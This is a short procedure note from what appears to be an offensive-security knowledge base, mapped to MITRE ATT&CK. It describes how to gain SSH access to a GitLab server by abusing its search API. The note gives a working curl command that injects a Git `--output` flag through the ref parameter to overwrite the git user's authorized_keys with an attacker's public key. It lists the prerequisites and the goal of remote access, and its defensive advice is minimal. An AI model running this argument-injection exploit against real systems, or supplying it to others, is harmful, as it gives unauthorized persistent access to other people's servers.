---
tags:
  - command-injection
  - ssh-key-injection
type: procedure
tools:
  - '[[tools/ssh]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Linux
  - Web
techniques:
  - '[[Unix Shell]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: aa0df5e8-5c01-4308-93cd-541a6b530417
created_at: '2025-12-11T03:47:47.581Z'
updated_at: '2025-12-11T03:47:47.581Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.004]]'
---
# Inject Git Flag to Overwrite Authorized Keys

## Summary

This procedure uses Git flag injection to overwrite the SSH authorized_keys file with an attacker's public key.

## Description

Building on the file overwrite, target /var/opt/gitlab/.ssh/authorized_keys to enable SSH access as git user.

## Requirements

1. API token
2. Pre-set wiki with key

## Defense

Defensive measures and detection strategies:

- Protect SSH config files
- Monitor file changes

## Objectives

1. Overwrite authorized_keys
2. Enable remote access

## Instructions

### Step 1: Execute API Call for Key Injection

**Context**: Inject ref to target authorized_keys.

**Command** ([[commands/curl-gitlab-search-api]]):
```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

> Writes key to authorized_keys.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques



## Commands Used

- [[commands/curl-gitlab-search-api]]

## Tools Used

- #curl

## Tags

- #command-injection
- [[tools/ssh]]
